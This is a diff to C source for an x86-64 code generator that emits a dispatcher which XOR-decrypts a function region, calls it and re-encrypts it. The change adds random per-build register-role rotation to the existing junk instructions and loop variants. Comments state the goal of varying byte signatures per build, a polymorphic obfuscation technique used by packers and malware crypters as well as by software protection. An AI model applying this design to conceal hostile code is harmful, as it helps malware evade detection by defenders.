@@ -1211,12 +1211,69 @@ static uint32_t emit_thunk(uint8_t *out,
     return (uint32_t)(p - out);
 }
 
+/* State-register emission helpers. Every helper takes register indices
+   in the 12..15 range (r12/r13/r14/r15) and emits the correct REX +
+   ModR/M bytes for the requested operation. Used by both emit_xor_loop
+   (for size/key regs) and emit_dispatcher (for the full role rotation).
+
+   All uses of ModR/M rm=100 need SIB (encodes "index+base" instead of
+   "base"); r12 as a memory base triggers this (r12 has low3=4, which
+   collides with rsp's encoding). r13 as memory base with mod=00 would
+   be interpreted as RIP-relative — so we always emit disp8=0 form to
+   keep encoding uniform across roles. Costs one byte per load vs the
+   variable "shortest form", worth the simplicity. */
+
+/* Emit `mov <dst>d, [<base>+disp8]`. dst/base must be in r8..r15 range. */
+static uint32_t emit_mov_r32_at_ptr(uint8_t *out, uint8_t dst, uint8_t base, int8_t disp) {
+    uint8_t *p = out;
+    uint8_t dst_high  = (dst  >= 8) ? 1 : 0;
+    uint8_t base_high = (base >= 8) ? 1 : 0;
+    uint8_t dst_low3  = dst  & 7;
+    uint8_t base_low3 = base & 7;
+    *p++ = 0x40 | (dst_high << 2) | base_high;    /* REX W=0 R=dst B=base */
+    *p++ = 0x8B;                                   /* MOV r32, r/m32       */
+    if(base_low3 == 4) {
+        *p++ = 0x40 | (dst_low3 << 3) | 4;         /* mod=01 rm=100 (SIB)  */
+        *p++ = 0x24;                                /* SIB idx=none base=4  */
+        *p++ = (uint8_t)disp;
+    } else {
+        *p++ = 0x40 | (dst_low3 << 3) | base_low3; /* mod=01 rm=base       */
+        *p++ = (uint8_t)disp;
+    }
+    return (uint32_t)(p - out);
+}
+
+/* Emit `movzx <dst>d, byte [<base>+disp8]`. */
+static uint32_t emit_movzx_r32_mem8(uint8_t *out, uint8_t dst, uint8_t base, int8_t disp) {
+    uint8_t *p = out;
+    uint8_t dst_high  = (dst  >= 8) ? 1 : 0;
+    uint8_t base_high = (base >= 8) ? 1 : 0;
+    uint8_t dst_low3  = dst  & 7;
+    uint8_t base_low3 = base & 7;
+    *p++ = 0x40 | (dst_high << 2) | base_high;    /* REX W=0 R=dst B=base */
+    *p++ = 0x0F; *p++ = 0xB6;                      /* MOVZX r32, r/m8      */
+    if(base_low3 == 4) {
+        *p++ = 0x40 | (dst_low3 << 3) | 4;
+        *p++ = 0x24;
+        *p++ = (uint8_t)disp;
+    } else {
+        *p++ = 0x40 | (dst_low3 << 3) | base_low3;
+        *p++ = (uint8_t)disp;
+    }
+    return (uint32_t)(p - out);
+}
+
 /* Emit one XOR-in-place loop that toggles a region with a byte key.
  *
  * Caller pre-loads:
- *   rax = base address of region
- *   r14 = size in bytes (upper 32 bits zero — comes from `mov r14d,...`)
- *   r15 = byte key (in r15b)
+ *   rax       = base address of region
+ *   size_reg  = size in bytes (upper 32 bits zero — comes from `mov r32,...`)
+ *   key_reg   = byte key (in low 8 bits)
+ *
+ * size_reg and key_reg are register indices in the 12..15 range (r12..r15).
+ * They're chosen by the dispatcher's per-build role rotation and passed
+ * through so the XOR loop's terminator/setup/xor opcodes vary with the
+ * rotation as well.
  *
  * Per emission we randomize three axes independently:
  *
@@ -1231,10 +1288,10 @@ static uint32_t emit_thunk(uint8_t *out,
  *      independent per call — any combo of decrypt/reencrypt directions
  *      still round-trips the region.
  *
- *   3. Shape: how the loop terminates. Both use the same body opcode
- *      for the terminator + jnz opcode 0x75, so the "shape signature"
- *      differs in the middle 3 bytes:
- *        - counter-shape: setup `mov helper_d, r14d`; each iter
+ *   3. Shape: how the loop terminates. Both use the same jnz opcode
+ *      0x75 as the final byte pair, so the "shape signature" differs
+ *      in the 3 bytes immediately preceding it:
+ *        - counter-shape: setup `mov helper_d, size_reg_d`; each iter
  *          `dec helper ; jnz`. Helper counts down from size to 0.
  *        - addr-shape:    setup `lea helper, [rax +/- ...]` capturing
  *          end/limit ptr; each iter `cmp rax, helper ; jne`. Loop ends
@@ -1247,12 +1304,8 @@ static uint32_t emit_thunk(uint8_t *out,
  * Post-loop:
  *   rax, helper reg, and flags all clobbered — caller must restore
  *   rax if needed (dispatcher reloads from rdi for loop2).
- *
- * Body size: setup (3..10) + xor (3) + inc/dec rax (3) + terminator
- * (2..3) + jnz rel8 (2) + up to 16 bytes junk + optional 6 bytes
- * reverse rax setup = up to ~40 bytes per loop.
  */
-static uint32_t emit_xor_loop(uint8_t *out) {
+static uint32_t emit_xor_loop(uint8_t *out, uint8_t size_reg, uint8_t key_reg) {
     /* rex_b = REX.B (r/m extension) or REX.R (reg extension) — same
        bit numeric value in the REX byte; low3 = 3-bit register field.
        Excludes rbp (5) — not in NONVOL_REGS push list. */
@@ -1272,6 +1325,11 @@ static uint32_t emit_xor_loop(uint8_t *out) {
     int      addr_shape = rnd[2] & 1;
     uint8_t  crex = CTR[cidx].rex_b;
     uint8_t  clow = CTR[cidx].low3;
+    /* size_reg / key_reg are always in r12..r15 range under N>1 dispatch,
+       so their REX high bit is always 1. Split into high-bit + low3. */
+    uint8_t sz_low3  = size_reg & 7;
+    uint8_t key_low3 = key_reg  & 7;
+
     uint8_t *p    = out;
 
     /* Setup order matters for addr-shape + reverse: the LEA needs rax
@@ -1288,27 +1346,33 @@ static uint32_t emit_xor_loop(uint8_t *out) {
 
     /* Reverse rax setup: rax = base + size - 1 (point to last byte). */
     if(rev) {
-        *p++ = 0x4C; *p++ = 0x01; *p++ = 0xF0;   /* add rax, r14 */
-        *p++ = 0x48; *p++ = 0xFF; *p++ = 0xC8;   /* dec rax      */
+        /* add rax, size_reg64
+           REX: W=1, R=1 (size_reg high), B=0 (rax); opcode 01;
+           ModR/M mod=11 reg=sz_low3 rm=000 */
+        *p++ = 0x4C;
+        *p++ = 0x01;
+        *p++ = 0xC0 | (sz_low3 << 3);
+        /* dec rax */
+        *p++ = 0x48; *p++ = 0xFF; *p++ = 0xC8;
     }
 
     if(addr_shape && !rev) {
-        /* lea helper, [rax + r14*1]  (limit = base + size)
-           REX: W=1, R=crex, X=1 (for r14 index); opcode 8D;
-           ModR/M mod=00 reg=clow rm=100 (SIB); SIB scale=00 idx=110 base=000 */
+        /* lea helper, [rax + size_reg*1]  (limit = base + size)
+           REX: W=1, R=crex, X=1 (size_reg high); opcode 8D;
+           ModR/M mod=00 reg=clow rm=100 (SIB); SIB scale=00 idx=sz_low3 base=000 */
         *p++ = 0x48 | (crex << 2) | 0x02;
         *p++ = 0x8D;
         *p++ = 0x04 | (clow << 3);
-        *p++ = 0x30;
+        *p++ = (sz_low3 << 3);
     }
 
     if(!addr_shape) {
-        /* counter-shape setup: mov helper_d, r14d
-           REX: W=0, R=1 (r14 src), B=crex (helper dst); opcode 89;
-           ModR/M mod=11 reg=6 (r14 low3) rm=clow */
+        /* counter-shape setup: mov helper_d, size_reg_d
+           REX: W=0, R=1 (size_reg high), B=crex (helper dst); opcode 89;
+           ModR/M mod=11 reg=sz_low3 rm=clow */
         *p++ = 0x44 | crex;
         *p++ = 0x89;
-        *p++ = 0xC0 | (6 << 3) | clow;
+        *p++ = 0xC0 | (sz_low3 << 3) | clow;
     }
 
     #define XJUNK(i) do { \
@@ -1321,8 +1385,11 @@ static uint32_t emit_xor_loop(uint8_t *out) {
     XJUNK(0);
     uint8_t *loop_top = p;
 
-    /* xor byte [rax], r15b */
-    *p++ = 0x44; *p++ = 0x30; *p++ = 0x38;
+    /* xor byte [rax], key_reg_b
+       REX: W=0, R=1 (key_reg high); opcode 30; ModR/M mod=00 reg=key_low3 rm=0 */
+    *p++ = 0x44;
+    *p++ = 0x30;
+    *p++ = (key_low3 << 3);
 
     XJUNK(1);
 
@@ -1388,15 +1455,45 @@ static uint32_t emit_dispatcher(uint8_t *out,
        carries which value:
          swap==0: r10=target_off, r11=callee_id
          swap==1: r11=target_off, r10=callee_id
-       Two dispatcher instructions below (`mov r12d, id_reg` and
-       `add rax, target_reg`) pick their ModR/M byte from this. */
-    uint8_t id_modrm     = input_swap ? 0xD4 : 0xDC; /* mov r12d, r10d or r11d */
-    uint8_t target_modrm = input_swap ? 0xD8 : 0xD0; /* add rax, r11 or r10   */
+       Two dispatcher instructions below (`mov PTR_d, id_reg_d` and
+       `add rax, target_reg`) pick their source reg based on this. */
+    uint8_t id_src_low3     = input_swap ? 2 : 3;  /* r10 low3 : r11 low3 */
+    uint8_t target_src_low3 = input_swap ? 3 : 2;
     #define D_OFF() ((uint32_t)(p - out))
     #define RIP_DISP32(target_off) do { \
         int32_t _d = (int32_t)(target_off) - (int32_t)(self_off + D_OFF() + 4); \
         memcpy(p, &_d, 4); p += 4; \
     } while(0)
+
+    /* --- State-register role rotation. Randomly permute 4 roles across
+       {r12, r13, r14, r15} per build. Every ModR/M byte referencing
+       these regs varies per build (24 permutations = ~4.6 bits of
+       entropy on top of everything else). Roles:
+         PTR: fn_entry ptr, later loader_base — 64-bit
+         OFF: fn_entry.offset — u32 (upper 32 zeroed by mov r32)
+         SZ:  fn_entry.size   — u32
+         KEY: fn_entry.key    — byte in low 8
+       emit_xor_loop is passed SZ and KEY so the XOR-loop opcodes vary
+       with the rotation as well. */
+    static const uint8_t STATE_REGS[4] = {12, 13, 14, 15};
+    uint8_t roles[4];
+    memcpy(roles, STATE_REGS, 4);
+    {
+        uint8_t rnd_bytes[4];
+        gen_random(rnd_bytes, 4);
+        for(int i = 3; i > 0; i--) {
+            int j = rnd_bytes[i] % (i + 1);
+            uint8_t t = roles[i];
+            roles[i] = roles[j];
+            roles[j] = t;
+        }
+    }
+    uint8_t PTR      = roles[0];
+    uint8_t OFF      = roles[1];
+    uint8_t SZ       = roles[2];
+    uint8_t KEY      = roles[3];
+    uint8_t PTR_low3 = PTR & 7;
+    uint8_t OFF_low3 = OFF & 7;
 
     /* --- Prologue: save the 7 nonvolatiles we clobber, in random
      * order per build. Pop order in the epilogue mirrors this array
@@ -1463,35 +1560,59 @@ static uint32_t emit_dispatcher(uint8_t *out,
     *p++ = 0x48; *p++ = 0x83; *p++ = 0xC6; *p++ = 0x10;  /* add rsi, 16 (skip marker+count+pad) */
 
     EMIT_JUNK();
-    *p++ = 0x45; *p++ = 0x89; *p++ = id_modrm;      /* mov r12d, <id_reg>d (callee_id → r12) */
+    /* mov PTR_d, <id_src>_d  (callee_id → PTR).
+       REX: W=0, R=1 (id_src high), B=1 (PTR high) */
+    *p++ = 0x45;
+    *p++ = 0x89;
+    *p++ = 0xC0 | (id_src_low3 << 3) | PTR_low3;
     EMIT_JUNK();
-    *p++ = 0x4D; *p++ = 0x6B; *p++ = 0xE4; *p++ = 0x0C;  /* imul r12, r12, 12 (entry size) */
+    /* imul PTR, PTR, 12  (entry size). REX: W=1, R=1, B=1 */
+    *p++ = 0x4D;
+    *p++ = 0x6B;
+    *p++ = 0xC0 | (PTR_low3 << 3) | PTR_low3;
+    *p++ = 0x0C;
     EMIT_JUNK();
-    *p++ = 0x49; *p++ = 0x01; *p++ = 0xF4;          /* add r12, rsi (r12 = &entries[id]) */
+    /* add PTR, rsi  (PTR = &entries[id]).
+       opcode 01; REX: W=1, R=0 (rsi low), B=1 (PTR high);
+       ModR/M mod=11 reg=6 (rsi low3) rm=PTR_low3 */
+    *p++ = 0x49;
+    *p++ = 0x01;
+    *p++ = 0xC0 | (6 << 3) | PTR_low3;
 
     /* --- Load fn_entry fields into nonvolatile regs --- */
     EMIT_JUNK();
-    *p++ = 0x45; *p++ = 0x8B; *p++ = 0x2C; *p++ = 0x24;              /* mov r13d, [r12]    (offset) */
+    p += emit_mov_r32_at_ptr(p, OFF, PTR, 0);   /* mov OFF_d, [PTR+0]      (offset) */
     EMIT_JUNK();
-    *p++ = 0x45; *p++ = 0x8B; *p++ = 0x74; *p++ = 0x24; *p++ = 0x04; /* mov r14d, [r12+4]  (size)   */
+    p += emit_mov_r32_at_ptr(p, SZ,  PTR, 4);   /* mov SZ_d,  [PTR+4]      (size)   */
     EMIT_JUNK();
-    *p++ = 0x45; *p++ = 0x0F; *p++ = 0xB6; *p++ = 0x7C; *p++ = 0x24; *p++ = 0x08; /* movzx r15d, byte [r12+8] (key) */
+    p += emit_movzx_r32_mem8(p, KEY, PTR, 8);   /* movzx KEY_d, byte [PTR+8] (key)  */
 
-    /* --- Compute loader_base into r12 (reuse — done with fn_entry ptr) --- */
+    /* --- Compute loader_base into PTR (reuse — done with fn_entry ptr) --- */
     EMIT_JUNK();
     *p++ = 0x48; *p++ = 0x8D; *p++ = 0x05;          /* lea rax, [rip+lb_disp] */
     RIP_DISP32(loader_off);
-    *p++ = 0x49; *p++ = 0x89; *p++ = 0xC4;          /* mov r12, rax (loader_base) */
+    /* mov PTR, rax  (PTR = loader_base).
+       opcode 89 (mov r/m64, r64); reg=src=rax (0), rm=dst=PTR.
+       REX: W=1, R=0 (rax low), B=1 (PTR high) */
+    *p++ = 0x49;
+    *p++ = 0x89;
+    *p++ = 0xC0 | (0 << 3) | PTR_low3;
 
-    /* --- XOR-decrypt callee region: rdi = base = loader_base + fn_entry.offset --- */
+    /* --- XOR-decrypt callee region: rdi = base = loader_base + OFF --- */
     EMIT_JUNK();
-    *p++ = 0x4C; *p++ = 0x01; *p++ = 0xE8;          /* add rax, r13 (loader_base + offset) */
-    /* r13 is 32-bit clean (upper zeroed by earlier mov r13d). Adding a full
+    /* add rax, OFF  (loader_base + offset).
+       opcode 01; REX: W=1, R=1 (OFF high), B=0 (rax low);
+       ModR/M mod=11 reg=OFF_low3 rm=0 (rax) */
+    *p++ = 0x4C;
+    *p++ = 0x01;
+    *p++ = 0xC0 | (OFF_low3 << 3);
+    /* OFF is 32-bit clean (upper zeroed by earlier mov r32). Adding a full
        64-bit reg is fine — high 32 bits are 0. */
     *p++ = 0x48; *p++ = 0x89; *p++ = 0xC7;          /* mov rdi, rax (save decrypt base) */
 
-    /* XOR-decrypt: randomized counter reg, direction, and body junk. */
-    p += emit_xor_loop(p);
+    /* XOR-decrypt: randomized helper, direction, shape, and body junk.
+       size_reg=SZ, key_reg=KEY driven by the role rotation. */
+    p += emit_xor_loop(p, SZ, KEY);
 
     /* --- Restore args and call callee at loader_base + r10 --- */
     *p++ = 0x48; *p++ = 0x8B; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x20; /* mov rcx, [rsp+0x20] */
@@ -1502,11 +1623,21 @@ static uint32_t emit_dispatcher(uint8_t *out,
     EMIT_JUNK();
     *p++ = 0x4C; *p++ = 0x8B; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x38; /* mov r9,  [rsp+0x38] */
 
-    /* Compute callee entry: rax = loader_base + r10 (target_blob_off) */
+    /* Compute callee entry: rax = loader_base + target_reg (r10 or r11) */
     EMIT_JUNK();
-    *p++ = 0x4C; *p++ = 0x89; *p++ = 0xE0;          /* mov rax, r12 (loader_base) */
+    /* mov rax, PTR (PTR = loader_base).
+       opcode 89; reg=src=PTR, rm=dst=rax (0).
+       REX: W=1, R=1 (PTR high), B=0 (rax low) */
+    *p++ = 0x4C;
+    *p++ = 0x89;
+    *p++ = 0xC0 | (PTR_low3 << 3);
     EMIT_JUNK();
-    *p++ = 0x4C; *p++ = 0x01; *p++ = target_modrm;  /* add rax, <target_reg> (+ target offset) */
+    /* add rax, <target_reg>.
+       opcode 01; reg=target_src, rm=rax (0).
+       REX: W=1, R=1 (target high), B=0 (rax low) */
+    *p++ = 0x4C;
+    *p++ = 0x01;
+    *p++ = 0xC0 | (target_src_low3 << 3);
     EMIT_JUNK();
     *p++ = 0xFF; *p++ = 0xD0;                       /* call rax */
 
@@ -1516,8 +1647,9 @@ static uint32_t emit_dispatcher(uint8_t *out,
     /* --- XOR-re-encrypt callee region using saved base (rdi) --- */
     *p++ = 0x48; *p++ = 0x89; *p++ = 0xF8;          /* mov rax, rdi */
 
-    /* Independent roll of counter reg + direction + junk from loop1. */
-    p += emit_xor_loop(p);
+    /* Independent roll of helper, direction, shape, and junk from loop1;
+       same size_reg/key_reg driven by the role rotation. */
+    p += emit_xor_loop(p, SZ, KEY);
 
     /* Restore rax (callee's return value) */
     *p++ = 0x48; *p++ = 0x8B; *p++ = 0x44; *p++ = 0x24; *p++ = 0x40; /* mov rax, [rsp+0x40] */
